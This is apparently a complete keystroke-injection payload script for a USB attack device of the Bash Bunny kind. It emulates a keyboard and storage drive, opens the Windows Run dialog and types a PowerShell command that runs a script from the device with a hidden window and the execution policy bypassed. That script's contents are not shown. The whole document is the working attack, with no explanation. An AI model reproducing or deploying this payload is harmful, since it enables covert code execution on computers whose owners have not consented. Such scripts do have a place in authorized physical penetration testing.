#!/bin/bash

ATTACKMODE HID STORAGE

LED ATTACK
QUACK DELAY 2000

QUACK GUI r
QUACK DELAY 500

QUACK STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "D:\payloads\switch1\core\noise-marker.ps1"
QUACK ENTER

LED FINISH
